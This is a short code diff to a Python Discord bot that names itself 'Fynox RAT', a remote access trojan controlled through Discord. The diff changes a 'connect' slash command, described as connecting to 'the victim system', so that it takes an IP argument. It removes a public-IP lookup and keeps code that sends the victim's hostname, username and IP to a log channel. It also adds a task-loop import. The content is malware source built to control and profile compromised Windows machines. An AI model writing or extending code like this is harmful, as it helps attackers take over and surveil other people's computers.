@@ -23,6 +23,7 @@ import win32com.client
 import win32net
 import win32security
 from discord.ext import commands
+from discord.ext import tasks
 from discord import app_commands
 import asyncio
 
@@ -86,26 +87,18 @@ async def on_ready():
         await channel.send(embed=embed)
 
 @bot.tree.command(name='connect', description='Connect to the victim system')
-async def connect_slash(interaction: discord.Interaction):
+@app_commands.describe(ip='IP address of the victim')
+async def connect_slash(interaction: discord.Interaction, ip: str):
     if str(interaction.channel.id) != str(LOG_CHANNEL_ID):
         await interaction.response.send_message("This command can only be used in the log channel.", ephemeral=True)
         return
-    
-    # Get public IP using IPify
-    try:
-        response = requests.get('https://api.ipify.org?format=json')
-        ip_data = response.json()
-        public_ip = ip_data['ip']
-    except:
-        # Fallback to hostname IP
-        public_ip = socket.gethostbyname(socket.gethostname())
     
     hostname = socket.gethostname()
     username = os.getlogin()
     
     embed = discord.Embed(
         title="💀 Fynox RAT - System Information",
-        description=f"**Username:** {username}\n**IP Address:** {public_ip}",
+        description=f"**Username:** {username}\n**IP Address:** {ip}",
         color=discord.Color.dark_red(),
         timestamp=datetime.datetime.now()
     )
